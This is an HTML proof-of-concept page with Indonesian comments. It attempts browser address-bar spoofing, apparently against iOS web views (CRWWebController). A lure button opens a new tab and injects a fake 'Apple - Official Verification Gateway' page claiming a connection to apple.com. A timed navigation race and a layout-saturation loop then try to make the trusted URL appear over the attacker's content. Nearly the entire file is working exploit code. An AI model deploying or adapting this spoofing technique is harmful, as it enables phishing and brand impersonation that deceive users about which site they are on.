<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
    <title>Advanced Security Assessment PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0b0b0c;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      }
      .container {
        text-align: center;
        background: #1c1c1e;
        padding: 40px;
        border-radius: 20px;
        box-shadow: 0 15px 35px rgba(0,0,0,0.6);
        max-width: 450px;
        width: 90%;
      }
      h2 {
        color: #f5f5f7;
        font-size: 22px;
        margin-bottom: 20px;
        font-weight: 500;
      }
      button {
        padding: 18px 32px;
        font-size: 18px;
        font-weight: 600;
        background: #0a84ff;
        color: #fff;
        border: none;
        border-radius: 12px;
        cursor: pointer;
        transition: transform 0.1s ease, background 0.2s ease;
        width: 100%;
      }
      button:active {
        transform: scale(0.96);
        background: #0071e3;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h2>System Integrity Validation Required</h2>
      <button id="startBtn">INITIALIZE SECURE BRIDGE</button>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = "none";

        // Membuka jendela target baru / tab asinkron
        const targetTab = window.open("about:blank", "_blank");

        if (targetTab) {
          // 1. Menyuntikkan tampilan spoofing visual beresolusi tinggi (Target Domain Mock)
          targetTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
              <title>Apple - Official Verification Gateway</title>
              <meta name="viewport" content="width=device-width, initial-scale=1.0">
            </head>
            <body style="margin:0;padding:0;background:#f5f5f7;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:-apple-system,sans-serif;">
              <div style="text-align:center;padding:30px;max-width:480px;">
                <h1 style="font-size:32px;color:#1d1d1f;margin-bottom:12px;font-weight:600;">Security Clearance Active</h1>
                <p style="font-size:16px;color:#86868b;line-height:1.4;margin-bottom:25px;">Your session has been securely validated through regional proxy endpoints.</p>
                <div style="padding:12px 20px;background:#e5e5ea;border-radius:8px;font-size:13px;color:#3a3a3c;font-weight:500;letter-spacing:0.3px;">
                  Connected Host: <span style="color:#007aff;">apple.com</span>
                </div>
              </div>
            </body>
            </html>
          `);
          targetTab.document.close();

          // 2. Memicu transisi navigasi asinkron berlapis (Multi-tier Timing Race Condition)
          setTimeout(() => {
            try {
              // Memaksa perpindahan mutlak ke domain target terpercaya sebelum tree layout selesai
              targetTab.location.replace("https://apple.com");
            } catch (e) {}
          }, 10);

          // 3. Teknik Bypass Baru: Mengganti pemblokiran prompt() dengan "DOM Heavy Reflow Saturation"
          // Ini membebani thread rendering secara lokal tanpa memicu dialog modal terlarang,
          // menguji apakah CRWWebController mengalami latensi sinkronisasi status URL.
          let counter = 0;
          const saturationInterval = setInterval(() => {
            counter++;
            try {
              if (targetTab.document && targetTab.document.body) {
                // Memanipulasi properti layout secara dinamis dengan kecepatan tinggi
                targetTab.document.body.style.zoom = (counter % 2 === 0) ? "1.0" : "1.0001";
              }
              if (counter > 150 || targetTab.closed) {
                clearInterval(saturationInterval);
              }
            } catch (err) {
              clearInterval(saturationInterval);
            }
          }, 4);
        }
      };
    </script>
  </body>
</html>
